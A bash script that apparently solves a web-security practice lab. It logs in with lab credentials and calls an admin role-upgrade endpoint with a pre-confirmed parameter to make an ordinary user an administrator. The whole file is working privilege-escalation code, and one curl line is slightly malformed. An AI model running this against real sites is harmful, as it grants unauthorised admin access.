#!/bin/bash


login() {

    echo "(+) Logging is as user Wiener..."
    login_page="${url}/login"
    credentials="username=wiener&password=peter"
    export cookie=$(curl -s -c - "%{http_code}" "$login_page" -d "$credentials" | awk '/session/ {print $NF}')
    account_page="${url}/my-account?id=wiener"
    response=$(curl -s ${account_page} -b "session=${cookie}")
    if echo "$response" | grep -q "Log out"; then
        echo "(+) Logged in successfully!"
    else
        echo "(-) Failed to log in"
        echo "(-) Exiting..."
        exit 1
    fi

}

upgrade_user() {

    echo "(+) Upgrading user Wiener..."
    upgrade_url="${url}/admin-roles"
    data="action=upgrade&confirmed=true&username=wiener"
    response=$(curl -s -d ${data} "${upgrade_url}" -b "session=${cookie}" -w "%{http_code}")
    if [[ "${response}" -eq 302 ]]; then
        echo "(+) Upgraded user Wiener to admin successfully"
    else
        echo "(-) Could not upgrade user Wiener"
        echo "(-) Exiting..."
        exit 1
    fi
}

main() {

    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url=$1
    login "$url"
    upgrade_user "$url"
    

}

main "$@"